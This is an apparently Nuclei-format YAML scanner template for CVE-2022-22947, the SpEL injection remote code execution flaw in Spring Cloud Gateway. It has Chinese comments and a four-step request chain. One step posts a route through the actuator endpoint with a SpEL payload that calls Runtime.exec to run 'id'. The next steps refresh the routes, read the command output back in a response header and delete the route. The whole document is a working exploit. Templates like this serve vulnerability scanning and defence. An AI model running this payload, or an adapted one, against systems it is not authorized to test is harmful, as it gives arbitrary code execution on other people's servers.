id: CVE-2022-22947
info:
  name: Spring Cloud Gateway SpEL RCE
  author: AutoRedTeam
  severity: critical
  description: |
    Spring Cloud Gateway 存在SpEL表达式注入漏洞，可执行任意代码。
    影响版本: 3.1.0, 3.0.0-3.0.6
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
    - https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports
  tags: spring, rce, spel, cve2022

requests:
  # Step 1: 添加恶意路由
  - method: POST
    path:
      - "{{BaseURL}}/actuator/gateway/routes/hacktest"
    headers:
      Content-Type: application/json
    body: |
      {
        "id": "hacktest",
        "filters": [{
          "name": "AddResponseHeader",
          "args": {
            "name": "Result",
            "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
          }
        }],
        "uri": "http://example.com"
      }
    matchers:
      - type: status
        status:
          - 201
    extractors:
      - type: regex
        name: route_id
        part: body
        regex:
          - '"id":"([^"]+)"'

  # Step 2: 刷新路由
  - method: POST
    path:
      - "{{BaseURL}}/actuator/gateway/refresh"
    matchers:
      - type: status
        status:
          - 200

  # Step 3: 触发漏洞
  - method: GET
    path:
      - "{{BaseURL}}/actuator/gateway/routes/hacktest"
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+"
      - type: status
        status:
          - 200
    matchers-condition: and

  # Step 4: 清理路由
  - method: DELETE
    path:
      - "{{BaseURL}}/actuator/gateway/routes/hacktest"
